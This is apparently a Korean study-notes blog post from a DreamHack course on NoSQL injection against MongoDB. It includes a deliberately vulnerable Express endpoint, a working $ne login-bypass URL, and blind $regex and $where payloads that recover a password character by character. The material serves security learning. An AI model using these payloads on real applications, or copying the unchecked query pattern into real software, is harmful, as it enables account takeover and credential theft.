---
layout: single
title:  "ServerSide : NoSQL Injection"
categories: DreamHack
tag: [DreamHack, WebHacking, Non-Relationa_DBMS,NoSQL,Injection]
toc: true
author_profile: false
---

# ServerSide : NoSQL Injection

[Non-Relational DBMS](https://dreamhack.io/lecture/courses/189)
 
NoSQL도 RDBMS와 같이 Injection 공격의 위험이 있다. 이번 코스는 MongoDB를  사용하면서 발생할 수 있는 NoSQL Injection에 대해 배워볼 예정이다.

## NoSQL Injection

NoSQL Injection은 이전에 배운 SQL Injection과 공격방법이 유사하다.  두 공격 모두 이용자의 입력값이 쿼리에 포함되면서 발생하는 문제다.


MongoDB는 문자열이 아닌 타입의 값을 입력할 수 있고, 이를 통해 연산자를 사용 할 수 있다.

아래 코드는 user 콜렉션에서 이용자가 입력한 "uid" 와 "upw"에 해당하는 데이터를 찾고 출력하는 코드다.

```js
const express = require('express');

const app = express();

const mongoose = require('mongoose');

const db = mongoose.connection;

mongoose.connect('mongodb://localhost:27017/', { useNewUrlParser: true, useUnifiedTopology: true });

app.get('/query', function(req,res) {

    db.collection('user').find({
        'uid': req.query.uid,
        'upw': req.query.upw
    }).toArray(function(err, result) {
        if (err) throw err;
        res.send(result);
  });
});

const server = app.listen(3000, function(){
    console.log('app.listen');
});

```

코드를 보면 이용자의 입력값에 대해 타입을 검증하지 않기 때문에 오브젝트 타압의 값을 입력할 수 있다.

"$ne" 연산자로 입력한 데이터와 일치하지 않는 데이터를 반환받을 수 있다. 즉 계정 정보를 모르더라도 해당 정보를 알 수 있다.

```
http://localhost:3000/query?uid[$ne]=a&upw[$ne]=a

=> [{"_id":"5ebb81732b75911dbcad8a19","uid":"admin","upw":"secretpassword"}]
```

```
{"uid": "admin", "upw": {"$ne" : ""} }
```

## Blind NoSQL Injection

Blind NoSQL Injection 또한 Blind SQL Injection 처럼 참/거짓 결과를 얻어 정보를 얻는 방식이다.

MongoDB에서는 "$regex", "$where" 연산자를 통해 Blind NoSQL Injection을 할 수 있다.

[MongoDB 연산자 정리](https://kieranoh.github.io/dreamhack/dreamhack-webhacking-8/)

[MongoDB 연산자 공식 문서](https://www.mongodb.com/docs/manual/reference/operator/query/)

"$regex"를 이용해 Blind NoSQL Injection 코드

```
> db.user.find({upw: {$regex: "^a"}})

> db.user.find({upw: {$regex: "^b"}})

...

> db.user.find({upw: {$regex: "^g"}})
{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
```

"$where"와 substring을 이용해 구하는 코드

```
>db.user.find({$where: "this.upw.substring(0,1)=='a'"})

> db.user.find({$where: "this.upw.substring(0,1)=='b'"})


...

> db.user.find({$where: "this.upw.substring(0,1)=='g'"})
{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }

```

비밀번호 길이 획득하는 방법

```
{"uid": "admin", "upw": {"$regex":".{5}"}}
=> admin

{"uid": "admin", "upw": {"$regex":".{6}"}}
=> undefined

```

비밀번호 획득하기

```
{"uid": "admin", "upw": {"$regex":"^a"}}
admin

{"uid": "admin", "upw": {"$regex":"^aa"}}
undefined

{"uid": "admin", "upw": {"$regex":"^ab"}}
undefined

{"uid": "admin", "upw": {"$regex":"^ap"}}
admin

...

{"uid": "admin", "upw": {"$regex":"^apple$"}}

```